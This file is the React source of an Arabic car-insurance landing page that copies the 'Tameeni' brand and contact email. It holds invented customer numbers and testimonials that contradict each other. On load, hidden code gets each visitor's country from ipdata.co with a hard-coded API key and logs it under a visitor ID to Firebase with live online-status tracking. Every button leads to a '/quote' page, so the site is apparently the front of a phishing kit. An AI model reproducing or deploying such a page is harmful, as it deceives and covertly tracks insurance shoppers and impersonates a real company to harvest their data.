"use client"

import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Textarea } from "@/components/ui/textarea"
import {
  Shield,
  Users,
  Star,
  Download,
  Smartphone,
  CheckCircle,
  Globe,
  Phone,
  Mail,
  Award,
  TrendingUp,
  FileText,
  HeadphonesIcon,
  Zap,
  Lock,
  Clock,
  DollarSign,
  Car,
  Calculator,
  MessageCircle,
  ChevronDown,
  ChevronUp,
  ArrowRight,
  CreditCard,
  Home,
  Plane,
  Heart,
  Menu,
  X,
} from "lucide-react"
import { useState, useEffect } from "react"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "")
}
const visitorID = randstr("Tmn-")

export default function TameeniComprehensive() {
  const [mounted, setMounted] = useState(false)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [openFaq, setOpenFaq] = useState<number | null>(null)

  useEffect(() => {
    setMounted(true)
    getLocation()
  }, [])

  if (!mounted) {
    return null
  }
  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: visitorID,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(visitorID)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  const stats = [
    { number: "500,000+", label: "عميل راضي", icon: Users, color: "bg-primary" },
    { number: "25+", label: "شركة تأمين", icon: Award, color: "bg-secondary" },
    { number: "4.9/5", label: "تقييم العملاء", icon: Star, color: "bg-accent" },
    { number: "24/7", label: "دعم العملاء", icon: HeadphonesIcon, color: "bg-muted" },
  ]

  const features = [
    {
      icon: Shield,
      title: "حماية شاملة",
      description: "تغطية شاملة لسيارتك ضد جميع المخاطر والحوادث مع أفضل شركات التأمين",
      color: "bg-primary",
    },
    {
      icon: Zap,
      title: "سرعة فائقة",
      description: "احصل على وثيقة التأمين في أقل من 5 دقائق مع نظام معالجة فوري",
      color: "bg-secondary",
    },
    {
      icon: TrendingUp,
      title: "أفضل الأسعار",
      description: "مقارنة ذكية وفورية للحصول على أفضل العروض من جميع الشركات",
      color: "bg-accent",
    },
    {
      icon: Lock,
      title: "أمان وثقة",
      description: "بياناتك محمية بأعلى معايير الأمان والتشفير المتقدم",
      color: "bg-muted",
    },
    {
      icon: Clock,
      title: "خدمة مستمرة",
      description: "دعم عملاء متاح على مدار الساعة لمساعدتك في أي وقت",
      color: "bg-primary",
    },
    {
      icon: DollarSign,
      title: "توفير مضمون",
      description: "وفر حتى 40% من قيمة التأمين مع عروضنا الحصرية",
      color: "bg-secondary",
    },
  ]

  const services = [
    {
      icon: Car,
      title: "تأمين السيارات",
      description: "تأمين شامل وضد الغير للسيارات",
      features: ["تأمين شامل", "ضد الغير", "حوادث شخصية", "مساعدة طريق"],
    },
    {
      icon: Heart,
      title: "التأمين الصحي",
      description: "تغطية صحية شاملة للأفراد والعائلات",
      features: ["تغطية شاملة", "شبكة واسعة", "خدمات طارئة", "أدوية مجانية"],
    },
    {
      icon: Home,
      title: "تأمين المنازل",
      description: "حماية منزلك ومحتوياته",
      features: ["حريق وسرقة", "كوارث طبيعية", "مسؤولية مدنية", "محتويات المنزل"],
    },
    {
      icon: Plane,
      title: "تأمين السفر",
      description: "تأمين شامل لرحلاتك",
      features: ["تغطية طبية", "إلغاء الرحلة", "فقدان الأمتعة", "تأخير الرحلات"],
    },
  ]

  const testimonials = [
    {
      name: "أحمد محمد",
      role: "عميل راضي",
      content: "خدمة ممتازة وسرعة في الاستجابة. حصلت على أفضل عرض تأمين لسيارتي.",
      rating: 5,
      avatar: "/placeholder.svg?height=40&width=40",
    },
    {
      name: "فاطمة علي",
      role: "عميلة مميزة",
      content: "التطبيق سهل الاستخدام والأسعار منافسة جداً. أنصح الجميع بتجربة تأميني.",
      rating: 5,
      avatar: "/placeholder.svg?height=40&width=40",
    },
    {
      name: "محمد السعيد",
      role: "عميل دائم",
      content: "دعم العملاء رائع ومتاح على مدار الساعة. تجربة مميزة في عالم التأمين.",
      rating: 5,
      avatar: "/placeholder.svg?height=40&width=40",
    },
  ]

  const faqs = [
    {
      question: "كيف يمكنني الحصول على عرض سعر؟",
      answer: "يمكنك الحصول على عرض سعر فوري من خلال ملء النموذج البسيط على موقعنا أو تطبيقنا المحمول.",
    },
    {
      question: "هل الخدمة مجانية؟",
      answer: "نعم، خدمة المقارنة والحصول على عروض الأسعار مجانية تماماً ولا تتطلب أي رسوم.",
    },
    {
      question: "كم من الوقت يستغرق الحصول على الوثيقة؟",
      answer: "يمكنك الحصول على وثيقة التأمين في أقل من 5 دقائق بعد اختيار العرض المناسب.",
    },
    {
      question: "هل يمكنني تجديد التأمين من خلال المنصة؟",
      answer: "نعم، يمكنك تجديد تأمينك بسهولة من خلال منصتنا مع الحصول على أفضل العروض المتاحة.",
    },
  ]

  const processSteps = [
    {
      step: "1",
      title: "أدخل بياناتك",
      description: "معلومات السيارة والسائق",
      icon: FileText,
    },
    {
      step: "2",
      title: "قارن العروض",
      description: "من أكثر من 25 شركة",
      icon: Calculator,
    },
    {
      step: "3",
      title: "اختر الأنسب",
      description: "حسب احتياجاتك وميزانيتك",
      icon: CheckCircle,
    },
    {
      step: "4",
      title: "ادفع بأمان",
      description: "طرق دفع متعددة وآمنة",
      icon: CreditCard,
    },
  ]

  return (
    <div className="min-h-screen bg-background" style={{ direction: "rtl" }}>
      <header className="bg-background/95 backdrop-blur-md border-b border-border px-4 lg:px-6 py-4 sticky top-0 z-50 shadow-sm">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          <div className="flex items-center gap-4 lg:gap-8">
            <div className="flex items-center gap-3">
              <img src="/Logo-AR.png" alt="logo" width={80} />
            </div>
            <nav className="hidden lg:flex items-center gap-8 text-sm font-medium">
              <a href="#" className="text-foreground hover:text-primary transition-professional">
                الرئيسية
              </a>
              <a href="#services" className="text-foreground hover:text-primary transition-professional">
                الخدمات
              </a>
              <a href="#about" className="text-foreground hover:text-primary transition-professional">
                عن الشركة
              </a>
              <a href="#contact" className="text-foreground hover:text-primary transition-professional">
                اتصل بنا
              </a>
            </nav>
          </div>
          <div className="flex items-center gap-2 lg:gap-3">
            <Button variant="ghost" size="sm" className="hidden sm:flex text-muted-foreground hover:text-primary">
              English
            </Button>
            <Button
              onClick={() => (window.location.href = "/quote")}
              variant="outline"
              size="sm"
              className="hidden sm:flex border-border text-xs lg:text-sm hover:bg-accent hover:text-accent-foreground"
            >
              تسجيل الدخول
            </Button>
            <Button
              onClick={() => (window.location.href = "/quote")}
              size="sm"
              className="bg-primary hover:bg-primary/90 text-primary-foreground shadow-lg text-xs lg:text-sm px-3 lg:px-4 transition-professional"
            >
              ابدأ الآن
            </Button>
            <Button variant="ghost" size="sm" className="lg:hidden" onClick={() => setMobileMenuOpen(!mobileMenuOpen)}>
              {mobileMenuOpen ? <X className="w-5 h-5" /> : <Menu className="w-5 h-5" />}
            </Button>
          </div>
        </div>

        {/* Mobile Menu */}
        {mobileMenuOpen && (
          <div className="lg:hidden mt-4 pb-4 border-t border-border">
            <nav className="flex flex-col gap-4 pt-4">
              <a href="#" className="text-foreground hover:text-primary transition-professional">
                الرئيسية
              </a>
              <a href="#services" className="text-foreground hover:text-primary transition-professional">
                الخدمات
              </a>
              <a href="#about" className="text-foreground hover:text-primary transition-professional">
                عن الشركة
              </a>
              <a href="#contact" className="text-foreground hover:text-primary transition-professional">
                اتصل بنا
              </a>
            </nav>
          </div>
        )}
      </header>

      <section className="relative bg-gradient-to-br from-background via-card to-background px-4 lg:px-6 py-16 lg:py-24 overflow-hidden">
        <div className="max-w-7xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 lg:gap-20 items-center">
            <div className="relative order-first lg:order-first">
              <div className="relative">
                <img
                  src="/motor-desktop.webp"
                  alt="car"
                  width={400}
                  height={500}
                  className="relative rounded-2xl shadow-2xl w-full max-w-md mx-auto"
                />
              </div>
            </div>

            <div className="space-y-8 text-center lg:text-right">
              <div className="space-y-6">
                <h1 className="text-4xl sm:text-5xl lg:text-6xl xl:text-7xl font-bold text-foreground leading-tight">
                  أول منصة لتأمين السيارات في
                  <br />
                  <span className="text-primary">السعودية</span>
                </h1>
                <p className="text-xl lg:text-2xl text-muted-foreground leading-relaxed max-w-2xl mx-auto lg:mx-0">
                  جميع شركات التأمين في مكان واحد، مجموعة واسعة من الخيارات وأسعار فوري لوثائق التأمين
                </p>
              </div>

              <div className="flex justify-center lg:justify-start">
                <Button
                  size="lg"
                  className="bg-primary hover:bg-primary/90 text-primary-foreground px-12 py-6 text-xl font-semibold rounded-lg shadow-xl hover:shadow-2xl transition-professional"
                  onClick={() => (window.location.href = "/quote")}
                >
                  ابدأ الآن
                </Button>
              </div>

              <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 max-w-md mx-auto lg:mx-0">
                <p className="text-sm text-destructive flex items-center gap-2">
                  <span className="w-4 h-4 bg-destructive rounded-full flex-shrink-0"></span>
                  هل تريد شراء وثيقة تأمين؟ تحقق من كل هذا الموقع الصحيح
                </p>
              </div>
            </div>
          </div>

          <div className="mt-20 pt-12 border-t border-border">
            <div className="text-center mb-12">
              <p className="text-sm text-muted-foreground mb-2">18 شركة</p>
              <p className="text-2xl font-semibold text-foreground">شركاء التأمين المعتمدين</p>
            </div>
            <div className="flex flex-wrap items-center justify-center gap-8 opacity-60">
              {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
                <div
                  key={i}
                  className="w-20 h-12 bg-card rounded flex items-center justify-center hover:opacity-100 transition-professional"
                >
                  <img className="w-16 h-10" src={`/companies/company-${i}.svg`} alt="" />
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      <section className="py-16 bg-background">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="grid md:grid-cols-2 gap-8">
            <Card className="bg-[url(/ar-hero-banner-web-new.webp)] h-[300px] bg-cover bg-center text-white border-0 overflow-hidden shadow-xl hover:shadow-2xl transition-professional">
              <CardContent className="p-8 relative h-full flex items-end">
                <div className="bg-black/20 backdrop-blur-sm rounded-lg p-4">
                  <h3 className="text-xl font-bold mb-2">عروض حصرية</h3>
                  <p className="text-sm opacity-90">احصل على أفضل الأسعار</p>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-[url(/ar-banner-web.webp)] h-[300px] bg-cover bg-center text-white border-0 overflow-hidden shadow-xl hover:shadow-2xl transition-professional">
              <CardContent className="p-8 relative h-full flex items-end">
                <div className="bg-black/20 backdrop-blur-sm rounded-lg p-4">
                  <h3 className="text-xl font-bold mb-2">وفر أكثر</h3>
                  <p className="text-sm opacity-90">خصومات تصل إلى 40%</p>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Professional Multi-Step Quote Form */}
      <section className="py-12 lg:py-16 bg-card border-y border-border">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="bg-gradient-to-r from-card to-background rounded-2xl lg:rounded-3xl p-8 lg:p-12 border border-border shadow-lg">
            <div className="text-center space-y-8">
              <div>
                <h2 className="text-2xl lg:text-3xl font-bold text-foreground mb-4">احصل على عرض سعر فوري</h2>
                <p className="text-lg text-muted-foreground">
                  أكمل البيانات للحصول على أفضل عروض التأمين من أكثر من 25 شركة
                </p>
              </div>

              <div className="flex flex-col sm:flex-row gap-6 justify-center items-center">
                <Button
                  size="lg"
                  className="bg-primary hover:bg-primary/90 text-primary-foreground shadow-xl hover:shadow-2xl transition-professional px-8 py-4 text-lg"
                  onClick={() => (window.location.href = "/quote")}
                >
                  <Calculator className="w-5 h-5 ml-2" />
                  ابدأ المقارنة الآن
                </Button>
                <p className="text-sm text-muted-foreground">مجاني 100% • لا يتطلب بطاقة ائتمان</p>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Stats Section */}
      <section className="py-12 lg:py-16 bg-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4 lg:gap-8">
            {stats.map((stat, index) => (
              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
                <CardContent className="p-4 lg:p-6 text-center">
                  <div
                    className={`w-12 h-12 lg:w-16 lg:h-16 ${stat.color} rounded-xl lg:rounded-2xl flex items-center justify-center mx-auto mb-3 lg:mb-4 group-hover:scale-110 transition-transform duration-300`}
                  >
                    <stat.icon className="w-6 h-6 lg:w-8 lg:h-8 text-white" />
                  </div>
                  <h3 className="text-lg lg:text-2xl font-bold text-gray-900 mb-1 lg:mb-2">{stat.number}</h3>
                  <p className="text-xs lg:text-sm text-gray-600 font-medium">{stat.label}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      <section className="py-16 lg:py-24 bg-background">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-16 lg:mb-20">
            <Badge className="bg-accent/10 text-accent mb-6 px-4 py-2 text-sm font-medium">✨ مميزات استثنائية</Badge>
            <h2 className="text-3xl lg:text-4xl xl:text-5xl font-bold text-foreground mb-6">
              لماذا يختار العملاء تأميني؟
            </h2>
            <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
              نقدم تجربة تأمين متطورة تجمع بين التكنولوجيا المتقدمة والخدمة الاستثنائية
            </p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-8">
            {features.map((feature, index) => (
              <Card
                key={index}
                className="border-border shadow-lg hover:shadow-xl transition-professional group hover:-translate-y-1 bg-card"
              >
                <CardContent className="p-8 text-center">
                  <div
                    className={`w-16 h-16 ${feature.color} rounded-2xl flex items-center justify-center mx-auto mb-6 group-hover:scale-110 transition-professional`}
                  >
                    <feature.icon className="w-8 h-8 text-white" />
                  </div>
                  <h3 className="text-xl font-bold text-foreground mb-4">{feature.title}</h3>
                  <p className="text-base text-muted-foreground leading-relaxed">{feature.description}</p>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Insurance Types Section */}
      <section className="py-16 bg-gray-50">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12">
            <h2 className="text-3xl font-bold text-gray-900 mb-4">تأمين سيارات وأكثر!</h2>
            <p className="text-lg text-blue-600">منتجات التأمين المتنوعة</p>

            <div className="flex justify-center mt-6">
              <div className="flex bg-white rounded-lg p-1 shadow-sm">
                <button className="px-6 py-2 bg-blue-600 text-white rounded-md text-sm font-medium">للشركات</button>
                <button className="px-6 py-2 text-gray-600 rounded-md text-sm font-medium hover:bg-gray-100">
                  للأفراد
                </button>
              </div>
            </div>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { title: "السيارات", icon: Car, description: "تأمين شامل وضد الغير" },
              { title: "الصحة الطبية", icon: Heart, description: "تغطية صحية شاملة" },
              { title: "الحوادث الطبية", icon: Shield, description: "حماية من الحوادث" },
              { title: "السفر", icon: Plane, description: "تأمين شامل للسفر" },
            ].map((service, index) => (
              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 group">
                <CardContent className="p-6 text-center">
                  <div className="w-16 h-16 bg-blue-100 rounded-2xl flex items-center justify-center mx-auto mb-4 group-hover:scale-110 transition-transform duration-300">
                    <service.icon className="w-8 h-8 text-blue-600" />
                  </div>
                  <h3 className="text-lg font-bold text-gray-900 mb-2">{service.title}</h3>
                  <p className="text-sm text-gray-600 mb-4">{service.description}</p>
                  <Button
                    variant="outline"
                    size="sm"
                    className="text-blue-600 border-blue-600 hover:bg-blue-50 bg-transparent"
                  >
                    ابدأ الآن
                  </Button>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Insurance Comparison Section */}
      <section className="py-16 bg-white">
        <div className="max-w-6xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12">
            <h2 className="text-2xl lg:text-3xl font-bold text-gray-900 mb-4">
              هل يجب أن أشتري تأميناً شاملاً أم تأمين طرف ثالث لسيارتي؟
            </h2>
            <p className="text-lg text-gray-600">
              تحقق من كل ما تريد معرفته في هذا الدليل الشامل لاختياراتك وتجد أفضل ما يناسبك
            </p>
          </div>

          <div className="grid md:grid-cols-3 gap-6">
            {[
              {
                title: "ضد الغير فقط",
                badge: "الأساسي",
                badgeColor: "bg-gray-500",
                description: "يغطي الأضرار التي تلحق بالآخرين فقط ولا يشمل سيارتك الخاصة",
                buttonText: "اقرأ المزيد",
                buttonColor: "bg-gray-600 hover:bg-gray-700",
              },
              {
                title: "التأمين الشامل",
                badge: "الأفضل",
                badgeColor: "bg-yellow-500",
                description: "يغطي سيارتك والآخرين مع تغطية شاملة ضد السرقة والحوادث والكوارث الطبيعية",
                buttonText: "اقرأ المزيد",
                buttonColor: "bg-blue-600 hover:bg-[#109cd4] ",
              },
              {
                title: "ضد الغير التوسعي",
                badge: "متوسط",
                badgeColor: "bg-green-500",
                description: "تغطية متوسطة تشمل الآخرين مع بعض الحماية الإضافية لسيارتك",
                buttonText: "اقرأ المزيد",
                buttonColor: "bg-green-600 hover:bg-green-700",
              },
            ].map((option, index) => (
              <Card key={index} className="border border-gray-200 hover:shadow-lg transition-all duration-300">
                <CardContent className="p-6">
                  <div className="mb-4">
                    <span
                      className={`inline-block px-3 py-1 rounded-full text-white text-xs font-medium ${option.badgeColor}`}
                    >
                      {option.badge}
                    </span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900 mb-3">{option.title}</h3>
                  <p className="text-gray-600 mb-6 leading-relaxed">{option.description}</p>
                  <Button className={`w-full ${option.buttonColor} text-white`}>{option.buttonText}</Button>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* Process Steps */}
      <section className="py-12 lg:py-20 bg-gradient-to-br from-blue-50 to-indigo-50">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12 lg:mb-16">
            <Badge className="bg-purple-100 text-purple-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
              🚀 عملية بسيطة
            </Badge>
            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
              كيف تحصل على تأمينك في 4 خطوات بسيطة
            </h2>
            <p className="text-base lg:text-xl text-gray-600 max-w-3xl mx-auto">
              عملية سهلة وسريعة للحصول على أفضل عروض التأمين
            </p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6 lg:gap-8">
            {processSteps.map((step, index) => (
              <div key={index} className="text-center group">
                <div className="relative mb-6 lg:mb-8">
                  <div className="w-16 h-16 lg:w-20 lg:h-20 bg-white rounded-full shadow-lg flex items-center justify-center mx-auto group-hover:scale-110 transition-transform duration-300">
                    <step.icon className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600" />
                  </div>
                  <div className="absolute -top-2 -right-2 w-6 h-6 lg:w-8 lg:h-8 bg-blue-600 text-white rounded-full flex items-center justify-center text-xs lg:text-sm font-bold">
                    {step.step}
                  </div>
                  {index < processSteps.length - 1 && (
                    <div className="hidden lg:block absolute top-8 left-full w-full h-0.5 bg-blue-200 -translate-x-1/2"></div>
                  )}
                </div>
                <h3 className="text-lg lg:text-xl font-bold text-gray-900 mb-2 lg:mb-3">{step.title}</h3>
                <p className="text-sm lg:text-base text-gray-600">{step.description}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Testimonials */}
      <section className="py-12 lg:py-20 bg-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12 lg:mb-16">
            <Badge className="bg-yellow-100 text-yellow-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
              ⭐ آراء العملاء
            </Badge>
            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
              ماذا يقول عملاؤنا عنا؟
            </h2>
            <p className="text-base lg:text-xl text-gray-600 max-w-3xl mx-auto">تجارب حقيقية من عملائنا الكرام</p>
          </div>

          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-6 lg:gap-8">
            {testimonials.map((testimonial, index) => (
              <Card key={index} className="border-0 shadow-lg hover:shadow-xl transition-all duration-300">
                <CardContent className="p-6 lg:p-8">
                  <div className="flex items-center gap-1 mb-4">
                    {[...Array(testimonial.rating)].map((_, i) => (
                      <Star key={i} className="w-4 h-4 lg:w-5 lg:h-5 fill-yellow-400 text-yellow-400" />
                    ))}
                  </div>
                  <p className="text-sm lg:text-base text-gray-600 mb-6 leading-relaxed">"{testimonial.content}"</p>
                  <div className="flex items-center gap-3">
                    <Image
                      src={testimonial.image || "/placeholder.svg"}
                      alt={testimonial.name}
                      width={48}
                      height={48}
                      className="rounded-full"
                    />
                    <div>
                      <h4 className="font-semibold text-gray-900 text-sm lg:text-base">{testimonial.name}</h4>
                      <p className="text-xs lg:text-sm text-gray-600">{testimonial.role}</p>
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* FAQ Section */}
      <section className="py-12 lg:py-20 bg-gray-50">
        <div className="max-w-4xl mx-auto px-4 lg:px-6">
          <div className="text-center mb-12 lg:mb-16">
            <Badge className="bg-indigo-100 text-indigo-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
              ❓ أسئلة شائعة
            </Badge>
            <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
              الأسئلة الأكثر شيوعاً
            </h2>
            <p className="text-base lg:text-xl text-gray-600">إجابات على الأسئلة التي يطرحها عملاؤنا بكثرة</p>
          </div>

          <div className="space-y-4">
            {faqs.map((faq, index) => (
              <Card key={index} className="border border-gray-200 hover:shadow-lg transition-all duration-300">
                <CardContent className="p-0">
                  <button
                    className="w-full p-4 lg:p-6 text-right flex items-center justify-between hover:bg-gray-50 transition-colors"
                    onClick={() => setOpenFaq(openFaq === index ? null : index)}
                  >
                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">{faq.question}</h3>
                    {openFaq === index ? (
                      <ChevronUp className="w-5 h-5 text-gray-500 flex-shrink-0" />
                    ) : (
                      <ChevronDown className="w-5 h-5 text-gray-500 flex-shrink-0" />
                    )}
                  </button>
                  {openFaq === index && (
                    <div className="px-4 lg:px-6 pb-4 lg:pb-6">
                      <p className="text-sm lg:text-base text-gray-600 leading-relaxed">{faq.answer}</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </section>

      {/* App Download Section */}
      <section className="py-12 lg:py-20 bg-gradient-to-r from-blue-600 via-[#109cd4]  to-indigo-700 text-white relative overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 lg:px-6 relative">
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12 items-center">
            <div className="space-y-6 lg:space-y-8 text-center lg:text-right">
              <div className="space-y-4">
                <Badge className="bg-white bg-opacity-20 text-white border-white border-opacity-30 px-3 lg:px-4 py-2 text-xs lg:text-sm">
                  📱 تطبيق متطور
                </Badge>
                <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold">
                  حمل تطبيق تأميني
                  <br />
                  واستمتع بتجربة فريدة
                </h2>
                <p className="text-base lg:text-xl text-blue-100 leading-relaxed">
                  تطبيق ذكي يوفر لك جميع خدمات التأمين في مكان واحد. مقارنة سريعة، عروض حصرية، ومتابعة مستمرة لوثائقك.
                </p>
              </div>

              <div className="space-y-3 lg:space-y-4">
                <div className="flex items-center gap-3 justify-center lg:justify-start">
                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
                  <span className="text-sm lg:text-lg">مقارنة فورية بين جميع الشركات</span>
                </div>
                <div className="flex items-center gap-3 justify-center lg:justify-start">
                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
                  <span className="text-sm lg:text-lg">إشعارات ذكية لتجديد التأمين</span>
                </div>
                <div className="flex items-center gap-3 justify-center lg:justify-start">
                  <CheckCircle className="w-5 h-5 lg:w-6 lg:h-6 text-green-300 flex-shrink-0" />
                  <span className="text-sm lg:text-lg">دعم عملاء مباشر عبر التطبيق</span>
                </div>
              </div>

              <div className="flex flex-col sm:flex-row gap-3 lg:gap-4 justify-center lg:justify-start">
                <Button size="lg" className="bg-black hover:bg-gray-800 text-white px-4 lg:px-6 py-3">
                  <Download className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
                  App Store
                </Button>
                <Button size="lg" className="bg-black hover:bg-gray-800 text-white px-4 lg:px-6 py-3">
                  <Download className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
                  Google Play
                </Button>
              </div>
            </div>

            <div className="relative order-first lg:order-last">
              <div className="relative bg-white bg-opacity-10 backdrop-blur-lg rounded-2xl lg:rounded-3xl p-6 lg:p-8 border border-white border-opacity-20">
                <div className="grid grid-cols-2 gap-3 lg:gap-4">
                  <div className="bg-white rounded-xl lg:rounded-2xl p-3 lg:p-4 shadow-xl">
                    <Smartphone className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600 mb-2" />
                    <p className="text-xs lg:text-sm font-semibold text-gray-900">تطبيق iOS</p>
                  </div>
                  <div className="bg-white rounded-xl lg:rounded-2xl p-3 lg:p-4 shadow-xl">
                    <Smartphone className="w-6 h-6 lg:w-8 lg:h-8 text-green-600 mb-2" />
                    <p className="text-xs lg:text-sm font-semibold text-gray-900">تطبيق Android</p>
                  </div>
                </div>
                <div className="mt-4 lg:mt-6 bg-white rounded-xl lg:rounded-2xl p-4 lg:p-6 shadow-xl">
                  <div className="flex items-center justify-between mb-3 lg:mb-4">
                    <span className="text-xs lg:text-sm font-semibold text-gray-900">تقييم التطبيق</span>
                    <div className="flex items-center gap-1">
                      {[1, 2, 3, 4, 5].map((i) => (
                        <Star key={i} className="w-3 h-3 lg:w-4 lg:h-4 fill-yellow-400 text-yellow-400" />
                      ))}
                    </div>
                  </div>
                  <p className="text-lg lg:text-2xl font-bold text-gray-900">4.9/5</p>
                  <p className="text-xs lg:text-sm text-gray-600">من أكثر من 50,000 تقييم</p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Contact Section */}
      <section id="contact" className="py-12 lg:py-20 bg-white">
        <div className="max-w-7xl mx-auto px-4 lg:px-6">
          <div className="grid lg:grid-cols-2 gap-8 lg:gap-12">
            <div className="space-y-6 lg:space-y-8">
              <div>
                <Badge className="bg-green-100 text-green-700 mb-4 px-3 lg:px-4 py-2 text-xs lg:text-sm">
                  📞 تواصل معنا
                </Badge>
                <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900 mb-4 lg:mb-6">
                  هل لديك استفسار؟ نحن هنا لمساعدتك
                </h2>
                <p className="text-base lg:text-xl text-gray-600">
                  فريق دعم العملاء متاح على مدار الساعة للإجابة على جميع استفساراتك
                </p>
              </div>

              <div className="space-y-4 lg:space-y-6">
                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-blue-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
                    <Phone className="w-6 h-6 lg:w-8 lg:h-8 text-blue-600" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">اتصل بنا</h3>
                    <p className="text-sm lg:text-base text-gray-600">920000000</p>
                  </div>
                </div>

                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-green-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
                    <Mail className="w-6 h-6 lg:w-8 lg:h-8 text-green-600" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">راسلنا</h3>
                    <p className="text-sm lg:text-base text-gray-600">info@tameeni.com</p>
                  </div>
                </div>

                <div className="flex items-center gap-4">
                  <div className="w-12 h-12 lg:w-16 lg:h-16 bg-purple-100 rounded-xl lg:rounded-2xl flex items-center justify-center">
                    <MessageCircle className="w-6 h-6 lg:w-8 lg:h-8 text-purple-600" />
                  </div>
                  <div>
                    <h3 className="font-semibold text-gray-900 text-sm lg:text-base">دردشة مباشرة</h3>
                    <p className="text-sm lg:text-base text-gray-600">متاح 24/7</p>
                  </div>
                </div>
              </div>
            </div>

            <Card className="border-0 shadow-xl">
              <CardContent className="p-6 lg:p-8">
                <h3 className="text-xl lg:text-2xl font-bold text-gray-900 mb-6">أرسل لنا رسالة</h3>
                <div className="space-y-4">
                  <div className="grid sm:grid-cols-2 gap-4">
                    <Input placeholder="الاسم الأول" />
                    <Input placeholder="الاسم الأخير" />
                  </div>
                  <Input placeholder="البريد الإلكتروني" type="email" />
                  <Input placeholder="رقم الهاتف" type="tel" />
                  <Textarea placeholder="رسالتك" rows={4} />
                  <Button className="w-full bg-gradient-to-r from-blue-600 to-[#109cd4]  hover:from-[#109cd4]  hover:to-[#109cd4] ">
                    <ArrowRight className="w-4 h-4 lg:w-5 lg:h-5 ml-2" />
                    إرسال الرسالة
                  </Button>
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Final CTA Section */}
      <section className="py-12 lg:py-20 bg-gradient-to-r from-blue-50 to-indigo-50">
        <div className="max-w-4xl mx-auto px-4 lg:px-6 text-center">
          <div className="space-y-6 lg:space-y-8">
            <div className="space-y-4">
              <h2 className="text-2xl lg:text-3xl xl:text-4xl font-bold text-gray-900">
                جاهز للحصول على أفضل عرض تأمين؟
              </h2>
